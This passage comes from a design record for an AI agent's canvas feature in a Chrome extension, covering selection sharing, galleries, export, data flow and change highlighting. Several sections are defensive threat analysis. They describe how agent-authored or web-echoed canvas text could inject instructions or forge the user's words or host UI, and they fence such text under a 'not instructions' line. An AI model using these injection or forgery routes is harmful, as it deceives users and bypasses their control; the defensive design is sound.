      do not touch it (focus moving to the note can clear the frame's selection); a click into the
      canvas closes it first anyway. **A re-render or a new version while it is open keeps it
      open, with the version it captured:** the user is writing about the text they saw, the host
      line names that version, and the agent `canvas_read`s before patching (`canvas_patch`
      rebases). Only the 💬 goes with the old DOM. While a send is in flight nothing but edit /
      delete closes it, so its result is not lost. A note closed unsent (Esc, outside click) comes
      back if the popover reopens on the same selection.
    - After a send or Esc the 💬 stays hidden for that selection until the selection changes; the
      header button still opens the popover for it. On close, focus goes back to the header button
      when the popover was opened from there, else to the canvas frame.
    *Where the selection is (Brett, 2026-10-12 17:43):* a selected common word ("the", 「決定」)
    told the agent nothing about where it is. The host line now carries **only two essentials**;
    the agent decides whether to `canvas_read` more (no surrounding paragraph, no offsets):
    `[canvas "X" (<id>) v7, text selected by the user in 「決定紀錄」 › 「2026-10-12」, lines 61–62 of the canvas content
    — as rendered, not the markdown source; canvas_read before canvas_patch]` (a deck adds
    `on slide 3`). Each part is left out when it is not known; with neither, the line is as before.
    - **Heading path:** the chain of enclosing headings of the selection's start, in document
      order — each heading above it closes the deeper ones (an `h2` after an `h3` replaces both
      levels), so the depth is the document's (`h1 › h3` when there is no `h2`). A selection in a
      heading ends the path with that heading. Rendered heading text, whitespace collapsed,
      control and bidi characters dropped, each ≤ 80 characters (cut with `…`), ≤ 6 deep, empty
      ones skipped; none above the selection → no path. In a deck: the headings of the
      selection's own slide only (a deck's slides are not sections of one document).
    - **Source line range:** the 1-based, inclusive lines of the **stored markdown of the version
      in the line** — the same text `canvas_read` returns for that version — that hold the
      block(s) the selection starts and ends in. The frame's markdown sink tags block elements
      with markdown-it's `token.map` (`data-line-start` / `data-line-end` on paragraphs,
      headings, list items, table rows, blockquotes, code blocks, rules; canvas rendering only —
      the chat renders without them; DOMPurify keeps `data-*` by default, no config change). The
      frame takes the nearest tagged ancestor of the first and last selected text and maps
      those lines back to the stored text: the document view renders
      `cleanEditorMarkdown(stored)`, which only drops or trims whole lines, so its line map gives
      the stored line exactly; a slide's lines are offset by where the slide starts in the deck
      text. Blank lines at a block's edge (a list item's tail) are trimmed.
    - **Never a wrong range — left out instead:** when the selection is not inside a tagged
      block; when the text has a lone CR (markdown-it counts it as a line break, a reader of the
      stored text may not); and, checked by the host at send, when the stored text is no longer
      the one rendered — the §3.5 normalization rewrites an agent version's text in place
      without a new version number, and a new version supersedes it (the header names the
      captured version; `canvas_read` returns the latest).
    - **Host checks** (`CanvasCore.askWhere`, the frame is not trusted with the line): `lines`
      `{from, to}` finite positive integers, `from ≤ to ≤` a sane maximum (the 2 MB text cap);
      `slide` a positive integer; headings plain strings, cleaned and capped as above. Anything
      malformed is dropped on its own — the selection is still offered without it.
    - **Not in this change:** the quick-action chips (below) stay unbuilt.
    *To chat input (Brett, 2026-10-13 01:12, replacing #138's Send selection; canvas only
    first):* to use a passage in a message of one's own, a **📨** sits right beside the 💬 (on its
    row, to its right; to its left at the frame's right edge; hidden when neither fits, and
    whenever the 💬 is hidden — `CanvasCore.askBeside`), and **📨 To chat input** (tooltip
    「放進聊天輸入框」) sits in the header next to 💬 Ask agent with the same visibility (📤 Send
    to agent stays the saved-edits push). A click **sends nothing**: the selection — the rendered
    text exactly as selected, with no host line, no fence, no "not instructions" line and no
    metadata — goes into the side panel's **chat input box** of the conversation that owns the
    canvas (`katashiro-canvas-to-input`), and the input is focused with the caret at the end. The
    user reads it, edits it and presses send, exactly as if they had typed or pasted it.
    - **Why it is not fenced:** what reaches the agent is the user's own message, sent by the
      user after reviewing it, so it is a user instruction by design — the same as pasting the
      text into the box by hand. Ask agent and Send to agent are different: they post at once,
      with no chance to read what goes out, and most of their bytes are agent-authored canvas
      content, so they stay under the push rules below (note first, host line, fenced data;
      review P1). #138's Send selection posted the selection that way at once; Brett chose
      "put it in the input box" instead, so the user decides what the message says.
    - **The input box:** empty (or only blanks) → the selection; a draft → kept, the selection
      on a new line after it, never over it (`CanvasCore.inputWithSelection`). Drafts are per
      conversation (multi-conversation P1b §4.8): an open but not current conversation is
      switched to first, as for a push; while the current one is replying (no switch, §3.5) the
      selection goes into that conversation's draft and the canvas says so. A conversation open
      in no panel gets the push refusals (archived; another window whose panel is closed, with a
      button to go there; no panel answering in this window, with 打開側邊欄). No agent has to be
      connected.
    - **Gate and caps:** the panel accepts it only from Katashiro's `canvas.html` (never a compare
      tab, never a content script), deduped by request id. The composer has no text cap of its
      own; the frame cuts a selection at `SELECTION_MAX` (20 KB) and marks it truncated — such a
      selection is **refused** (「選取的文字超過 20 KB，沒放進輸入框…」), never put in cut, and the
      panel refuses text over the same cap. The old 20 KB push truncation note does not apply.
    - **Same refusals as Ask agent** (view mode, a frame, a text kind, never a compare tab). Both
      controls are disabled while the panel is asked; the result is a header notice
      (「📨 已放進輸入框」, 「📨 已放進那段對話的草稿…」, or 「沒放進輸入框：…」). The selection
      stays; like after an Ask agent send, its 💬 / 📨 stay away until it changes. Showing or
      hiding the header buttons can wrap a narrow header onto another row, so the 💬 / 📨 /
      popover are placed again once the header settles. Web pages (a context-menu entry) are
      deferred.
    - **Then Enter sends (Brett, 2026-10-13 16:31, real Chrome 155):** the panel's
      `messageInput.focus()` cannot take the window's keyboard focus from the canvas tab (the side
      panel is another document), so Enter right after 📨 landed in the canvas and did nothing.
      Two parts. (1) *Best effort:* when a Katashiro panel is already open in the tab's window
      (cached from `chrome.runtime.getContexts`, refreshed on focus and on a new selection), the
      click calls `chrome.sidePanel.open({windowId})` before any `await` (it needs the user
      gesture), errors ignored; whether Chrome moves the focus into an already-open panel is not
      documented. (2) *Guaranteed:* if the canvas tab still has the focus when the panel answers
      ok (`document.hasFocus()`), it is **armed** for 30 s (`CanvasCore.TO_INPUT_ARM_MS`) and says
      「📨 已放進輸入框 — 按 Enter 送出、Esc 取消」. While armed (`CanvasCore.toInputArmKey`):
      **Enter** with no modifier and not in an IME composition asks the panel
      (`katashiro-canvas-submit-input{conversationId, reqId}`, no text) to send its input exactly
      as its send button would (`sendMessage`), then 「已送出」; **Esc** disarms (「已取消」, the
      text stays); any other key (Shift+Enter included), a mouse press, a new selection, edit mode,
      a frame reload, the focus leaving the tab, or the timeout disarm silently; a lone modifier
      changes nothing. One request per arming. Not armed after the draft case (the text is in a
      conversation not on screen), nor when the panel took the focus (then Enter is the panel's
      own, so nothing is sent twice). When not armed the 📨 gives up the focus, so an Enter
      there is not another click.
      - **The panel's gate** (`CanvasCore.submitInputRefusal`): the sender as for To chat input
        (Katashiro's `canvas.html`, never a compare tab or a web page), the conversation open in
        this panel, deduped by request id; then refused unless that conversation is **the one on
        screen** (its input box holds the text — another conversation's draft is never sent from
        here; the canvas says 「沒送出：那段對話不是側邊欄目前的對話…」), the input is not empty,
        and no earlier request is still being sent. The canvas tab becomes the working tab first
        (§4.3 of multi-conversation, as for a push), so the send does not move the user off it.
      - **Trust:** keys are read in the trusted host page (`canvas.js`, `isTrusted` events, window
        capture phase, ahead of a focused 📨 button turning Enter into another click). Should the
        focus be in `canvas-frame.html`, the host sends it `armKeys{on}` and the frame reports its
        next key or mouse press as `armedKey{key, shiftKey, ctrlKey, altKey, metaKey, isComposing,
        keyCode}` — allow-listed and nonce-checked like every frame message (§3.2), refused from a
        compare tab, and acted on only while the host is armed and the frame holds the focus; the
        host makes the decision from the fields. `canvas-frame.html` runs no agent script, and the
        `html` frame (phase 2) never gets `armKeys`. Even a forged report could only send what the
        user put in their own input box, during the 30 s after their own click; nothing about the
        input's content comes from the canvas side.
  - **Try fixing** (phase 1): when `canvas-frame.html` reports `error{}` (a bad mermaid diagram, a
    reveal error, a CSP violation), the error banner has a *Send error to agent* button with the
    message, sent as data (rules below). **The `html` frame never gets this button with its
    message:** its `error{msg}` is fully controlled by agent script (and can arrive before the load
    gate fires, §3.2), so one click would turn 500 characters of arbitrary text into the user's
    words. For an `html` canvas the button sends only host-composed text,
    `[canvas "X" v3 (html) failed to render]`, with no `msg`.
  - **Download as markdown** (phase 1) beside PDF; Word export can come later.
  - **Canvas gallery** (phase 2): one page listing every canvas across conversations, with search,
    so a canvas is findable after its conversation scrolls away.
    *As implemented (總覽頁):* `canvas-gallery.html`, an extension page like `canvas.html` (not a
    sandbox page, never web-accessible, §3.2), opened from 🗂️ in the panel header or **🗂️ 總覽**
    in the canvas header; one gallery tab is reused. Rows come from the metas only (`allMetas()`,
    the budget's scan), newest first: kind icon, title, version, last author, update time
    (relative; local absolute on hover), size (latest + agent copy) and conversation (its short
    id until multi-conversation names exist). Search is NFKC + case folded, every term must match:
    titles, then the content of markdown/slides canvases, read lazily and cached per version and
    `normalized` flag (the editor's normalization rewrites `latest` without a version bump)
    (≤ 300 canvases / 16 MB per pass; the rest by title only, and the page says so). Canvases an
    incognito window stored before #109 (`noMirror`) are not listed until the update removes them
    (§3.6). A row asks the
    panel of that canvas's conversation to open it (`katashiro-canvas-open`, accepted only from
    `canvas-gallery.html`; the panel answers once the tab exists, before grouping), so it goes
    through the card's `openCanvasTab`: the most recently used tab of that canvas (`CanvasTabs.pickCanvasTab`, never a compare tab, §3.1), else a new tab in
    that conversation's group. With no such panel the gallery focuses that tab itself, or opens one
    ungrouped beside it and says so. 🗑 is the canvas tab's delete (same confirm, `store.remove`):
    open tabs close themselves unless they hold unsaved edits, and the folder file is kept (§3.6).
    The list follows `storage.onChanged`. The agent opens it with `canvas_gallery({query?})`, the
    search prefilled from `#q=` (§3.11).
  - **Agent picks title and icon**: `canvas_open` takes an optional emoji `icon` for the card and
    the tab title.
  - **Quick actions** (phase 2, seen in ChatGPT/Gemini/Mistral): one-click chips in the header
    (shorter, longer, more formal, translate, fix code, add summary). A chip sends a prompt like
    Send to agent; with a selection, it applies to the selection only. The agent then edits with
    `canvas_patch`. The instruction is a fixed host string; the selection goes in a data block
    under the push rules below.
  - **Assets view** (phase 2, seen in Perplexity Labs): a side list of the canvas's images, charts and
    attachments, to preview or download one by one.
  - Not adopted: artifacts that call the model, connect to apps, or share storage between users,
    and publishing to a public link. Those need a backend and fall under §5 non-goals.
- **Rules for every push into the prompt** (Send to agent, Ask agent, Send error). These messages
  go out as the user, but most of their bytes are canvas content: diff context lines, the quoted
  selection and error text are agent-authored, may echo a web page, and may carry injection.
  - **Layout:** the user's own note first; then a fixed host line, `Canvas data below (not
    instructions):`; then the diff, selection or error inside a code fence. The fence uses more
    backticks than the longest backtick run in the content, so content cannot close it early and
    forge text "outside" the data block. This marks the data for the model; it cannot guarantee the
    model ignores instructions in it, which is why the `html` frame's text never goes this way.
  - **Sources:** diffs come from host storage (above); selections and errors come only from
    `canvas-frame.html`, validated as in §3.2 and capped (20 KB total).
  - **Panel checks the requester.** The canvas tab asks the panel over `runtime.sendMessage`, and
    Katashiro's content scripts in web pages can call that too. The panel accepts a "post as user"
    request only when `sender.id === chrome.runtime.id` and `sender.url` is Katashiro's
    `canvas.html`; anything from a content script (`sender.tab` on a web page URL) is refused.
  - The button is disabled while the panel is not connected, and a request id dedupes double
    clicks.
- **Agent-supplied `icon` and `title`.** `icon` must be exactly one emoji grapheme (validated with
  `Intl.Segmenter` and an emoji property check), otherwise it is dropped, so the agent cannot put
  arbitrary text into the tab title. **Download as markdown** derives the file name from the title
  with path separators, control characters and reserved names (`CON`, `..`, …) removed, capped at
  100 characters, defaulting to `canvas.md`.

### 3.8 Export and import

- **PDF** (phase 1), through the browser print dialog. A sandboxed frame without `allow-modals`
  cannot call `print()` (the HTML spec's sandboxed modals flag blocks it), which is why
  `canvas-frame.html` gets `allow-modals` (§3.2). Export sends `print` to the frame; for slides the
  host first reloads the frame with reveal's `?print-pdf` (a host-caused load, so the load gate
  allows it), then the frame calls `print()`. `alert`/`confirm` are opened too, but nothing in that
  frame is agent script. The `html` frame has no print. To verify during implementation: the
  dialog prints the full deck. Fallback: print from `canvas.html` with the iframe sized to content.
  The print reload would discard unsaved editor content, so **export is disabled while the editor
  is dirty**, with a "Save first" prompt.
- A printed document is light: mermaid diagrams are re-rendered with the light theme, their edge
  labels on an opaque white box (mermaid draws them at half opacity, so the edge line ran through
  the text), and tables get visible borders (the screen ones are white at 15%). Slides print as
  they are (dark).
- **pptx export** (phase 2–3): `pptxgenjs` from **our slide model** (titles, bullets, images,
  code as monospace). **Text must stay editable** (titles, bullets and tables as real text boxes, never one image per slide, the NotebookLM complaint). The result is editable in PowerPoint but **not pixel-faithful**: reveal CSS
  and themes, fragments and transitions are lost. `dom-to-pptx` is the higher-fidelity candidate,
  to evaluate then.
- **pptx import** (phase 3+, not committed): `pptxtojson` → markdown slides, keeping titles, text and
  images. **Layout will not survive.** It is positioned as "bring the content in", not "round-trip".

### 3.9 Data flow — where canvas data lives and who can reach it

The diagrams show phase 1. Phase 2's `canvas-html-frame.html` sits beside `canvas-frame.html`
with the same edges, but its allow-list has no `save`, `selection` or `openLink` (§3.2).

**Components** (who holds what):

```mermaid
flowchart TB
  AG["Agent (e.g. Orca on ECS)<br/>calls canvas_* tools"]
  OA["openab: MCP facade + gateway<br/>(relays only, stores nothing)"]
  subgraph CH["Brett's Chrome profile"]
    SP["Side panel<br/>ACP socket + browser MCP server<br/>runs canvas_* tools"]
    ST[("chrome.storage.local<br/>working copy of canvases")]
    FS[("Local folder (optional)<br/>.md + assets, latest only")]
    CV["canvas.html tab<br/>header, Edit/Save, Revert,<br/>Send to agent"]
    FR["canvas-frame.html<br/>sandbox iframe: render + editor<br/>no storage, no network"]
    WEB["Web pages"]
  end
  AG <-->|"tool calls (MCP)"| OA
  OA <-->|"MCP-over-ACP tunnel (wss)"| SP
  SP <-->|"read / write<br/>(navigator.locks)"| ST
  CV <-->|"read / write, onChanged<br/>(navigator.locks)"| ST
  CV <-->|"postMessage (nonce, allow-list)"| FR
  SP -->|"write-through"| FS
  CV <-->|"write-through, read-back"| FS
  WEB -.->|"blocked: not web_accessible"| CV
```

**Paths** (write, user edit, read, push):

```mermaid
sequenceDiagram
  participant A as Agent
  participant O as openab
  participant P as Side panel
  participant S as storage.local
  participant C as canvas.html
  participant F as sandbox frame
  A->>O: canvas_open(title, kind, content)
  O->>P: tunnel: tools/call
  Note over P,C: every read-check-write holds navigator.locks('canvas:<id>')
  P->>S: write meta + v1 (normalized: false)
  S-->>C: onChanged
  C->>F: render v1
  F->>C: rendered{v1, normalized}
  C->>S: replace v1 text, meta v1.normalized = true
  S-->>P: onChanged (meta)
  P-->>A: {id, version: 1, normalizedDiff?}
  Note over P: on timeout: return with normalized false
  Note over F: user clicks Edit, then Save
  F->>C: save{content, baseVersion: 1}
  C->>S: write v2 (author: user)
  A->>O: canvas_read(id)
  O->>P: tunnel: tools/call
  P->>S: read latest
  P-->>A: v2 (+ diff from agent's v1)
  Note over C: user clicks Send to agent
  C->>P: post user message (diff v1→v2)
  P->>O: session/prompt
  O->>A: prompt
```

- **Canvases live on the user's machine only:** the working copy in the Chrome profile
  (`chrome.storage.local`; Katashiro does not run in incognito, #109), plus an optional mirror in a
  folder the user picked (§3.6). openab does not store canvases. The agent container holds only
  what passed through the agent's context (what it wrote, or read with `canvas_read`), like any
  tool result. Nothing goes to a cloud service.
- **Write path, agent → canvas:** agent tool call → facade → gateway → the panel's ACP socket → the
  panel's browser MCP server validates it and writes a new version → open canvas tabs see
  `storage.onChanged` and re-render (or show "Agent saved vN" if the user is editing, §3.5).
- **Read path, canvas → agent:** `canvas_read` takes the same route back, with the panel reading
  storage. **Send to agent** is the push path: the canvas tab asks the panel to post a user chat
  message (§3.7).
- **Who can reach the data:** extension pages of Katashiro (panel, `canvas.html`) only. Sandbox
  frames never touch storage; they see one canvas's content, handed to them by `postMessage`. Web
  pages and other extensions cannot (no `web_accessible_resources`, §3.2).
- **Panel closed or agent disconnected:** canvas tabs still open, render and edit from storage, and
  saves are kept. Agent tools fail with "Katashiro side panel not open", like `show_image` today;
  the agent sees the user's edits on its next `canvas_read`.
- **Libraries are local.** Every engine (markdown-it, DOMPurify, reveal.js, Milkdown, later Chart.js
  and mermaid) is vendored into the extension (`vendor/`, pinned and reproducible via
  `scripts/vendor-build/`) and loaded from the extension's own origin. The sandbox CSP
  (`script-src 'self'`, `connect-src 'none'`) makes loading from the internet impossible, not just
  unused. Updating a library is a Katashiro release, never a runtime download.

### 3.10 Showing what changed (Brett, 2026-10-10)

Borrowed from Gemini's *Show recent changes*, done live: the agent's last write is the baseline of
the glow and of Compare; ◐ 顯示變更 compares the previous version with the latest (§3.5 history,
2026-10-11).

- **Glow on every agent write (phase 1).** When an agent version renders, `canvas-frame.html`
  compares it with the previous content at **block level** (paragraph, heading, list item, table
  row, slide) and gives new or changed blocks a glow that fades over a few seconds; a removed
  block leaves a thin marker. For `canvas_patch` the changed ranges are known exactly, and exactly
  that text glows (below).
- **"Changes since you last looked" without history.** The content the user last saw is not kept
  (§3.5), so `meta` stores a **block hash list** of the last render the user saw: one short hash
  per block, tens of bytes each, no content. On the next open the new render is hashed the same
  way; blocks with a new hash count as added or changed, missing hashes as removed. The header
  shows *"3 changes since you last looked"* and a click replays the glow on those blocks.
- **Compare in Split View (phase 1).** *Compare with agent's* opens a second, **read-only** tab
  `canvas.html?id=…&view=agent` with the agent's last write and splits it with the canvas tab.
  Both panes mark the differing blocks, and **the markers stay while the compare is open** (Brett,
  2026-10-11: no fade in Split View), re-marked after every render and cleared when the compare
  tab closes; if the agent copy equals the latest, it says *"No differences"*.
  - **Split rules.** Chrome splits two tabs at a time, and the canvas tab may already be split with
    a web page (and moved into that page's group, §3.1). Compare first ends that split under the
    §3.1 move rules, returns the canvas tab to the canvas group, then splits it with the compare
    tab, both in the canvas group. When compare ends, the earlier web-page split is **not**
    restored. Without Split View (Chrome < 155) the compare view opens as a normal tab.
  - **Ending it.** The compare tab has a **✕ 結束比較** button (Brett, 2026-10-11) that closes it.
    Closing **either** tab ends the compare: closing the compare tab just removes the
    split; closing the canvas tab closes the compare tab too. *Revert to agent's* also ends it.
  - **It is not the canvas.** The compare tab has its own iframe, nonce and load count (§3.2 is
    unchanged); its host shows no Edit, Send to agent or Revert, and its allow-list refuses `save`
    and `selection`. The duplicate-tab rule (most recently used tab, §3.1) and "found again by
    URL" both **ignore `view=agent`**, so a card never focuses a compare tab.
  - **Agent writes during compare.** The `agent` copy changes, so the host re-sends `render` to the
    compare frame (no reload) and both panes re-glow.
- **Agent pointing (phase 1).** `canvas_highlight` (§3.4) lets the agent say "look here" while it
  explains. The agent controls the anchor and the label, so both are constrained to point, not
  forge:
  - **Anchoring.** `find` matches the **rendered text** of a block (what the user sees, not the
    markdown source), must match exactly one block, and is at most 500 characters; `heading`
    matches a heading's rendered text exactly. No match or several matches return an error.
  - **Where the label goes.** Only inside the sandbox frame, never in the host's header or banner
    area. It sits in the margin beside the block or just above it, never over text, in a fixed
    "agent note" style with an agent icon and an `Agent:` prefix, visibly different from host UI
    and the §3.2 banner. Text via `textContent`, at most 80 characters. So "✅ Verified by
    Katashiro" still reads as something the agent said.
  - **What the glow may change.** Outline and background only, never text color, opacity or
    visibility, so a highlight cannot hide or wash out content. `durationMs` is capped at 10 s, and
    calls are rate-limited per canvas.
  - **While the user edits,** it does not scroll or take focus; the header shows *"Agent wants to
    show you a section"* and the user clicks to go there.
  - **`kind:"html"` refuses it.** The host sends the new `highlight{…}` message only to
    `canvas-frame.html`.
- **Effects are ours, not agent CSS.** `canvas-frame.html` runs no agent code (§3.2), so the agent
  cannot inject CSS there; it picks from fixed effects (glow, underline, label) and gives a text
  anchor. An `html` canvas is agent code already and can style itself.
- **Phase 1 as implemented (PR 6).**
  - *Glow:* the host marks a render `glowPrev` when an agent version newer than the one it last
    rendered arrives; the frame keys each block by tag + rendered text (own text only, so a list
    item's sub-list is its own block; one key per slide for slides) and diffs with an LCS
    (`CanvasCore.diffBlocks`; above 10⁶ cells everything between the common ends counts as changed).
    The §3.5 normalization re-render of the same version keeps the glow. Fade ~4 s; with
    `prefers-reduced-motion` the glow is static and then removed. A removed table row's marker is
    drawn on the next row's cells.
  - *Compare:* the canvas tab asks the side panel (`katashiro-canvas-compare`, accepted only from
    that canvas tab, same id, no `view`); the panel ends any split the canvas tab is in (including
    one the user made: the button is the user's request), moves it back by the §3.1 record, then
    opens the compare tab after it in the canvas tab's group and splits them. Without a panel the
    canvas tab opens the compare view as a normal tab. The compare tab closes itself when no tab of
    that canvas is left. The *"N changes since you last looked"* hash list and `canvas_patch`'s
    exact ranges are not in phase 1 (§5 lists only the three items here; `canvas_patch` is phase 2).
    *`canvas_patch` as implemented (exact ranges, #107):* the store keeps the patch's ranges
    (`planPatch`, offsets in the new text) in `meta.patchRanges`; any other write drops them, and
    so does the §3.5 normalization (it rewrites the text the offsets point into). While the latest is
    that agent write, the host adds them to the render as `glowRanges` (`CanvasCore.patchGlowRanges`).
    The frame glows **exactly the changed text**, inline, not its block: it renders a copy of the
    text with marks around each range (`CanvasCore.markRanges`), detached, and block *i* of the copy
    says which characters of shown block *i* changed (`takeMarks`); those characters are wrapped and
    glow. Marks are rare Unicode punctuation (so `_em_` stays emphasis) and stay out of syntax that
    would change the document's blocks: a line's leading markers, a fence, a delimiter row, a
    separator, a table cell's pipes. If the copy's blocks still differ from the view's, the block
    diff glows as before; a block whose text a mark changed, and a mermaid diagram, glow whole; a
    deletion marks the block now standing where the text was (its top edge; the last block's bottom
    edge for a deletion at the end; the whole block when the text went from inside it). The normalization re-render of the same version glows the same
    characters while its blocks are unchanged. Exact ranges are for the fading glow only: ◐ 顯示變更's
    held markers and a compare compare whole texts, so they stay block-level.
    `scripts/smoke-glow-ranges.mjs` checks this in headless Chrome.
  - *◐ 顯示變更 (Brett, 2026-10-11: "the difference disappears after some time").* A header switch
    on markdown and slides canvases (not in a compare tab), stored once for all canvas tabs
    (`canvas:showChanges` in `chrome.storage.local`; open tabs follow through `storage.onChanged`).
    While on, the markers are **held** (the compare's no-fade mode) and re-applied after every
    render (`glow{against, hold}` on `rendered{}`); turning it off clears them (later agent writes
    fade as before), turning it on marks at once. The agent sets the same switch with
    `canvas_view({showChanges})`, and starts or ends a compare with `canvas_view({id, compare})` (§3.11).
    **Baseline: previous → latest, any author (Brett, 2026-10-11, with §3.5 history).** The
    markers compare the latest with the version before it in history (`store.readPrevious`,
    `CanvasCore.heldChanges`), whoever wrote either: after an agent write they show that write,
    after a user save that one. The previous version is stored, so a reloaded tab
    marks the same thing. With no previous (v1, or nothing left before the latest) nothing is
    marked, and the switch's title says so. This replaces #110's baseline (the text the tab showed
    just before the latest agent write, kept only in the host's memory, with the agent copy as a
    fallback after a reload). While editing nothing is marked, and while a compare is open its
    markers win; when it ends, these come back.
  - *Pointing:* the label is placed in the flow just above the block (before the table for a row,
    at the top of a list item), so it never covers text; it shifts the content below while shown.
- **Skill (Brett, 2026-10-10).** `skills/katashiro-point-at` (#67) teaches agents when and how to
  point: `katashiro.highlight` on the displayed page first, `katashiro.inject_css` for several
  elements (cleared afterwards), and `canvas_highlight` on canvases.

### 3.11 Agent equivalents of the user's view switches (Brett, 2026-10-12)

> "For features that are clicked (enabled) by user, we should have an equivalent switch for
> agents." (Brett, 2026-10-12)

Canvas tabs and the gallery are `chrome-extension://` pages, so the agent's page tools (`snapshot`,
`click`, …) cannot touch them (§3.2), and that stays so on purpose: most header buttons are the
user's decisions. **The rule: every display switch the user can turn on gets a dedicated agent
tool, with the same preconditions and the same code path as the button; never arbitrary clicking.**

| Button | Agent tool | Behaves like the button |
|---|---|---|
| ◐ 顯示變更 on / off | `canvas_view({showChanges})` | Writes `canvas:showChanges` in `chrome.storage.local`; every canvas tab follows through `storage.onChanged`, exactly as after a click in one tab. It is **global**, not per canvas, and the tool description and result say so. |
| ⇆ Compare with agent's | `canvas_view({id, compare: true})` | Refused, with the reason, where the button is hidden: not a text kind (image, html), no agent copy, the latest is the agent's own write (identical), the user is editing, the canvas is not shown in its tab. Otherwise the canvas tab is asked (an open one stays where it is until the compare has started, so a refused request never takes focus from an edit; a canvas with no tab is opened in front) (panel → canvas tab, runtime messaging, side panel only, never a compare tab) to run the button's own handler: `katashiro-canvas-compare` back to the panel, which splits as in §3.10, and the tab holds the compare markers. An open compare is just focused. The answer waits on the tab queue, so the panel allows 20 s (the only outer bound is the tunnel's `tunnel_timeout_seconds`, 170 s by default, on the facade path too); past that, a compare tab that did open counts as success, and otherwise the error says the compare may still open. |
| ✕ 結束比較 | `canvas_view({id, compare: false})` | Closes that canvas's compare tab(s), as the button does; the canvas tab sees the close and clears its compare markers (§3.10). "No compare was open" is not an error. |
| 🗂️ 總覽 | `canvas_gallery({query?})` | The panel's 🗂️: one reused gallery tab, in the panel's window. `query` fills the search box: the URL carries `#q=<encoded>`, the gallery reads it on load and on `hashchange`, strips control and bidi-control characters, drops zero-width ones, collapses whitespace, caps it at 200 characters, puts it in the box (`value`, never markup) and clears the fragment, so the next query is a new navigation. |

- **Seeing the result.** `katashiro.screenshot` already captured canvas tabs (§3.2 allow-list by
  exact URL prefix). It now also captures `canvas-gallery.html`, and only that page: other
  extension pages, Katashiro's own included, stay refused, and DOM tools stay refused on both.
- **May an agent see other conversations' canvases? — (a) accepted (Brett, 2026-10-12 16:01 TPE).**
  The gallery lists every conversation's canvases with snippets, and `canvas_gallery({query})`
  searches their text, so an agent that screenshots it reads canvases of other conversations (and
  other agents) that `canvas_list` (session scope) does not show it. (A canvas tab of another
  conversation that happens to be in front is screenshot-able already, before §3.11.)
  - **(a) Accept — chosen.** It is the view the user has, in the user's own browser; `canvas_list`'s
    scope keeps tool results tidy and is not a boundary between conversations. Written down here.
  - (b) Scope it (not chosen; the way to tighten it later). An agent-opened gallery shows only that conversation (`#conv=`), and
    screenshot refuses canvas tabs of other conversations.
- **Not gated by act mode**, like the other canvas tools (§3.4): they change what is shown, not any
  web page, and never content.
- **Deliberately not offered to the agent** (the user's decisions): ✏️ edit / 💾 save / ↶ ↷ undo
  and redo, Revert to agent's, Send to agent, 💬 Ask agent, 📁 Reconnect folder, 重新寫入, ⬇ `.md`
  / `.mmd` download, PDF / print, and the conflict view's buttons. The agent changes content only
  through `canvas_open` / `canvas_patch` (§3.5), and the user's own edits only through those
  buttons.

---

## Consequences

### Positive
- Long and structured output gets a full-width, persistent home, and the chat stays short.
- Diagrams and charts render in Brett's Chrome. The agent container needs no browser.
- Agent-authored script is possible (phase 2) without touching the token-holding origin.
- One model (canvas plus card) serves documents, slides, charts and diagrams.

### Negative / tradeoffs
- Vendor weight: Milkdown crepe 2.7 MB minified (phase 1), reveal.js ~120 KB + CSS/themes, Chart.js
  ~200 KB, mermaid-tiny 2.7 MB (shipped 2026-10-11; loaded only by canvases with a diagram). The release zip grows by roughly 6 MB at full scope.
- More Chrome tabs than an in-page tab strip would need (one per open canvas, each loading its own
  sandbox frame), and group bookkeeping around Split View (§3.1).
- A second rendering path (sandbox) beside the panel's markdown sink, with its own security review.
- The sandbox does not stop a frame from navigating itself. That takes a load gate, link
  interception and per-frame message allow-lists (§3.2), and the `html` kind still cannot be made
  leak-proof.
- Short history inside Katashiro: the last N versions (default 10) plus the agent's last write,
  and the user cannot step back to one (only ◐ previous → latest and Revert to agent's use it); the
  editor's undo covers only the current edit session. Anything older needs the folder mirror under
  git (§3.6). Each version is a full copy, so a canvas can take up to N + 1 times its size against
  the budget.
- pptx in either direction is lossy and must be described honestly in the UI.

### Neutral
- No openab changes: tools ride the existing MCP-over-ACP tunnel.
- The markdown ADR §3.6 dagre lean is superseded for the canvas. The chat is unchanged.

---

## 4. Alternatives considered

- **Render in the side panel.** Too narrow, and agent HTML would sit next to the tokens. Rejected.
- **Host the canvas on a remote origin** (artifacts-style separate domain, e.g. S3/CloudFront).
  That needs infra, network egress and auth, and the content leaves the machine. Rejected; the MV3
  sandbox gives the same isolation offline.
- **`data:` URL in a new tab.** Chrome restricts top-level `data:` navigation, a `data:` page has no
  channel back for saves/edits, and its CSP is not ours to set. Rejected.
- **Offscreen document.** Not visible, and it has `chrome.*` access. Wrong tool.
- **Render on the server and send images** (mmdc, headless Chrome in the agent). Heavy (a browser in
  every agent container, and not covered by state backup), static, and not editable. Kept only as
  `show_image` for one-off pictures.
- **Quill for editing.** It loses markdown structure on a round trip (§2). Rejected for Milkdown and
  CodeMirror (Brett, 2026-10-10).
- **One canvas tab with its own internal tab strip.** Keeps Chrome's tab bar to one tab per window and
  makes conversation switching a single swap. But it means building tab UI, and side-by-side
  comparison needs a "pop out" step. Rejected for native tabs + tab group (Brett, 2026-10-10).
- **Only one canvas at a time.** Simplest, but a document and a deck cannot coexist, and a new canvas
  overwrites the old one. Rejected.

## 5. Scope and non-goals

- **Phase 1 scope:** canvas tabs in a per-conversation tab group (with the Split View rule, §3.1),
  sandbox frame, `markdown`/`slides`/`image`, `canvas_open`/`canvas_read`/`canvas_list`, revision counter + agent's last write,
  card, PDF via print, **Milkdown editing of `markdown` canvases** with the §3.5 concurrency, and
  showing changes: glow on agent writes, Compare in Split View, `canvas_highlight` (§3.10), and the
  optional local folder mirror, write-through only (§3.6, §6 Q6; read-back and import are phase 2).
- **No embedded third-party media (Brett, 2026-10-10).** YouTube and other external videos or
  iframes are shown as **links** only: a click goes through `openLink` (§3.2) and opens a new tab.
  Embedding would need `frame-src` to a third party from the sandbox, a new egress path, and
  YouTube's embed may also require a Referer that an opaque-origin frame does not send.
- **No cloud publishing (Brett, 2026-10-11).** Publishing a canvas to the cloud is not a Katashiro
  feature: it is the agent's own capability (`canvas_read` → the agent's own storage and
  credentials), so Katashiro binds to no host. Agents should confirm with the user before
  publishing, since it sends canvas content (including user edits) outside the browser.
- **No incognito (#109).** `manifest.json` sets `"incognito": "not_allowed"`: content sent to the
  agent cannot be forgotten, so an incognito promise cannot be kept (§3.6). Canvases older versions
  stored for incognito panels are removed on install/update.
- **No agent tool for the user's decisions (§3.11).** The agent gets the display switches only;
